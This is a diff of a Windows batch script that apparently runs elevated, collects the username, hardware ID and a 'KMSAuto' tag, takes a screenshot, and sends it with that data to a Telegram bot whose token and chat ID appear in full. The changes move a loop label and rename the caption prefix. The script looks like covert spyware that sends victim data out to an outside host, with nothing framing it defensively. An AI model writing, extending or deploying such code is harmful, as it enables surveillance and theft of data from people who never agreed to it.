@@ -4,6 +4,20 @@
 
 
 
+
+
+:: Initialize the loop counter outside of the loop
+set loopCount=0
+
+
+
+
+
+
+:loop_start
+
+
+
 ::RUNADMINHERE ( Is Running with Elevated  Privileges , because this file is called by elevated batch file )
 
 
@@ -265,17 +279,6 @@ set "MESSAGE=%MESSAGE%|KMSAuto|"
 
 
 
-:: Initialize the loop counter outside of the loop
-set loopCount=0
-
-
-
-
-
-
-:loop_start
-
-
 
 
 :SENDMSG
@@ -292,7 +295,7 @@ PowerShell -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -Asse
 :: Set bot token, chat ID, and caption
 set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
 set "CHAT_ID=-1002163721260"
-set "CAPTION=PCNEWW|%USERNAME%|%HWID%|STARTED|%MESSAGE%"
+set "CAPTION=PCAA|%USERNAME%|%HWID%|STARTED|%MESSAGE%"
 set "PHOTO_PATH=%USERPROFILE%\Downloads\screenshot.png"
 
 :: URL encode the caption
